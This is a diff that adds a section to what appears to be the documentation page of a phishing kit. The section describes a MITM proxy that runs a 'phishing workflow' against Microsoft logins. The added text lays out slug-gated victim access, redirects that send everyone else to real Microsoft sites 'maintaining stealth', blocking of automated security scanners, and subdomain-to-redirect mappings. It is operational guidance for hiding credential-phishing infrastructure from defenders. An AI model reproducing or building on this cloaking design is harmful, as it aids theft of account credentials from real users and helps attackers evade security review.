@@ -97,6 +97,78 @@
             </div>
         </section>
 
+        <!-- Unauthorized Access Protection -->
+        <section class="mb-12">
+            <h2 class="text-2xl font-semibold text-gray-800 mb-6">🛡️ Unauthorized Access Protection</h2>
+            
+            <div class="bg-purple-50 border-l-4 border-purple-400 p-4 mb-6">
+                <div class="flex">
+                    <div class="ml-3">
+                        <p class="text-sm text-purple-700">
+                            <strong>🆕 NEW FEATURE:</strong> Advanced protection against reconnaissance and unauthorized access attempts.
+                            Automatically redirects unauthorized visitors to legitimate Microsoft services.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="grid md:grid-cols-2 gap-6 mb-6">
+                <div class="bg-white p-6 rounded-lg shadow-sm border">
+                    <h3 class="text-lg font-semibold mb-4 text-green-600">✅ Protected Access</h3>
+                    <div class="space-y-2 text-sm">
+                        <div class="font-mono bg-gray-50 p-2 rounded">
+                            login.domain.com/<span class="text-green-600">valid-slug</span>
+                        </div>
+                        <div class="font-mono bg-gray-50 p-2 rounded">
+                            domain.com/?slug=<span class="text-green-600">valid-slug</span>
+                        </div>
+                        <p class="text-gray-600 mt-3">
+                            Valid slug holders access the MITM proxy normally and proceed with phishing workflow.
+                        </p>
+                    </div>
+                </div>
+
+                <div class="bg-white p-6 rounded-lg shadow-sm border">
+                    <h3 class="text-lg font-semibold mb-4 text-red-600">❌ Blocked Access</h3>
+                    <div class="space-y-2 text-sm">
+                        <div class="font-mono bg-gray-50 p-2 rounded">
+                            login.domain.com<span class="text-red-600">/</span>
+                        </div>
+                        <div class="font-mono bg-gray-50 p-2 rounded">
+                            <span class="text-red-600">domain.com</span>
+                        </div>
+                        <p class="text-gray-600 mt-3">
+                            Unauthorized visitors get redirected to real Microsoft services, maintaining stealth.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="bg-white p-6 rounded-lg shadow-sm border">
+                <h3 class="text-lg font-semibold mb-4">Smart Redirect Logic</h3>
+                <div class="grid md:grid-cols-2 gap-4">
+                    <div>
+                        <h4 class="font-medium mb-2">Subdomain Detection</h4>
+                        <ul class="text-sm space-y-1">
+                            <li><code>outlook.*</code> → outlook.live.com</li>
+                            <li><code>login.*</code> → login.microsoftonline.com</li>
+                            <li><code>secure.*</code> → login.microsoftonline.com</li>
+                            <li><code>live.*</code> → login.live.com</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h4 class="font-medium mb-2">Security Benefits</h4>
+                        <ul class="text-sm space-y-1">
+                            <li>• Prevents reconnaissance attempts</li>
+                            <li>• Blocks automated security scanners</li>
+                            <li>• Maintains legitimate appearance</li>
+                            <li>• Logs all unauthorized attempts</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
         <!-- Data Encryption -->
         <section class="mb-12">
             <h2 class="text-2xl font-semibold text-gray-800 mb-6">🔐 Data Encryption System</h2>
